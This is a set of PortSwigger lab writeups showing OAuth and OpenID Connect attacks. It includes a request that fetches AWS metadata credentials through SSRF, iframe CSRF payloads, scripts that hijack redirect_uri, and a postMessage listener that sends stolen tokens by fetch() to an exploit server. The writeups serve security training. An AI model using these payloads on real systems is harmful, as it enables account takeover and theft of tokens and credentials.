# OAuth 2.0 & OIDC Labs 01-06 — Proof of Concept Writeups

This document contains structured Proof of Concept (PoC) writeups for OAuth 2.0 and OpenID Connect (OIDC) Labs 01 to 06 from the PortSwigger Web Security Academy.

---

## Lab 01 — Authentication Bypass via OAuth Implicit Flow

- **Goal:** Bypass authentication to log in as `administrator`.
- **Vulnerability:** Backend client trusts user parameters sent in POST requests during Implicit OAuth login.

### Proof of Concept (PoC)
1. Navigate to the login page and choose "Log in with social media".
2. Intercept the POST request sent to the client application containing the OAuth token:
   ```http
   POST /authenticate HTTP/2
   ...
   {"token":"eyJhbG...","email":"wiener@normal-user.net","username":"wiener"}
   ```
3. Change the `"email"` to `"admin@dontwannapay.com"` (or the administrator email) and change `"username"` to `"administrator"`.
4. Submit the request. The server accepts it and issues an administrative session.

### Why It Works
The client backend receives the email and username parameters and trusts them directly to establish a session, failing to verify with the OAuth provider userInfo endpoint that the access token actually belongs to the submitted username.

---

## Lab 02 — SSRF via OpenID Dynamic Client Registration

- **Goal:** Perform SSRF via Dynamic Registration to extract AWS metadata credentials.
- **Vulnerability:** Server trusts dynamic `logo_uri` parameters during registration.

### Proof of Concept (PoC)
1. Enumerate the OIDC configuration endpoint: `GET /.well-known/openid-configuration`.
2. Locate the dynamic client registration endpoint: `/register`.
3. Submit a POST request to register a new client containing a malicious `logo_uri` pointing to the internal metadata service:
   ```http
   POST /register HTTP/1.1
   Content-Type: application/json

   {
     "redirect_uris": ["https://exploit-server.net/callback"],
     "client_name": "attacker-client",
     "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
   }
   ```
4. Record the generated `client_id` from the response.
5. Trigger the client page that displays client logos (e.g. initiating authorization using the client ID).
6. Retrieve the AWS metadata details reflected in the server's logo display output.

### Why It Works
During dynamic registration, the OpenID provider backend fetches resources defined in `logo_uri` to cache and render them. Since the server does not validate the target URI host, it permits Server-Side Request Forgery against internal services.

---

## Lab 03 — Forced OAuth Profile Linking

- **Goal:** Perform CSRF to link the victim's account to the attacker's social profile.
- **Vulnerability:** Missing `state` parameter in the OAuth redirection flow.

### Proof of Concept (PoC)
1. Log in to the application using classic password credentials.
2. Click "Link social profile" and intercept the request.
3. Observe that the authorization URL does not contain a `state` parameter:
   `/auth?client_id=123&redirect_uri=https://client.net/oauth-callback`
4. Copy the URL callback redirect address before your browser processes it (preserving the code).
5. Construct an exploit HTML forcing the victim to navigate to your copied callback link:
   ```html
   <iframe src="https://<lab-id>.web-security-academy.net/oauth-callback?code=ATTACKER_CODE"></iframe>
   ```
6. The victim's active profile links to your social media account.

### Why It Works
Because the redirection flow does not enforce validation of a dynamic, unpredictable `state` parameter, the client application cannot distinguish if the profile-linking transaction was initiated by the active session owner or forged by an external site.

---

## Lab 04 — OAuth Account Hijacking via redirect_uri

- **Goal:** Steal authorization codes by manipulating the `redirect_uri` parameter.
- **Vulnerability:** Flawed regex validation of the `redirect_uri` parameter.

### Proof of Concept (PoC)
1. Initiate the OAuth login flow and intercept the request.
2. Modify the `redirect_uri` parameter to point to your exploit server:
   `/auth?client_id=123&redirect_uri=https://exploit-server.net/callback`
3. If WAF filters require the target domain, exploit wildcard/subdomain matching:
   `https://client.net.exploit-server.net/callback` or `https://client.net/callback/../../exploit-server`
4. Construct an exploit link sending the victim to the manipulated authorization path:
   ```html
   <script>
     location.href = "https://oauth-server.net/auth?client_id=123&redirect_uri=https://exploit-server.net/callback&response_type=code&scope=openid";
   </script>
   ```
5. Retrieve the victim's authorization code from the access logs of the exploit server.

### Why It Works
The authorization server verifies `redirect_uri` using weak string containment algorithms, permitting URI redirections to external malicious domains.

---

## Lab 05 — Stealing OAuth Access Tokens via Open Redirect

- **Goal:** Exfiltrate OAuth access tokens via a client-side Open Redirect.
- **Vulnerability:** Combining strict `redirect_uri` checks with an Open Redirect page on the target host.

### Proof of Concept (PoC)
1. Note that the OAuth provider strictly validates `redirect_uri` to match the client host.
2. Find an open redirect vulnerability on the client application (e.g. `/post?postId=1&url=https://evil.com`).
3. Construct the `redirect_uri` to trigger the open redirect parameter:
   `redirect_uri=https://client.net/oauth-callback/../../post?postId=1%26url=https://exploit-server.net/log`
4. When the victim initiates the login, the OAuth server sends the token in the URL fragment to the client callback, which redirects the browser to the exploit server, carrying the fragment block:
   `https://exploit-server.net/log#access_token=TOKEN`
5. Extract the token from the referrer/hash logs.

### Why It Works
Even though the OAuth provider limits callbacks to the client host, the client host contains an Open Redirect. The browser preserves URL fragments (`#`) across redirects, delivering the access token directly to the attacker's web server.

---

## Lab 06 — Stealing OAuth Access Tokens via a Proxy Page

- **Goal:** Steal access tokens using postMessage origin gaps.
- **Vulnerability:** Dynamic postMessage delivery with wildcards (`*`).

### Proof of Concept (PoC)
1. Locate the callback file which forwards tokens back to the parent screen using:
   `window.parent.postMessage(token, '*')`
2. Create an iframe inside the exploit server hosting page that loads the target OAuth initiation URL.
3. Configure a window listener to capture postMessage transmissions:
   ```html
   <iframe src="https://oauth-server.net/auth?client_id=123&redirect_uri=https://client.net/oauth-callback&response_type=token"></iframe>
   <script>
     window.addEventListener("message", function(e) {
       fetch("https://exploit-server.net/log?token=" + e.data);
     }, false);
   </script>
   ```
4. Extract the token from the incoming request query parameter logs.

### Why It Works
Using wildcard (`*`) targets inside `postMessage` delivers data payload strings blindly to any parent window listener. Attackers wrap the transaction in an iframe to easily capture the incoming access token.
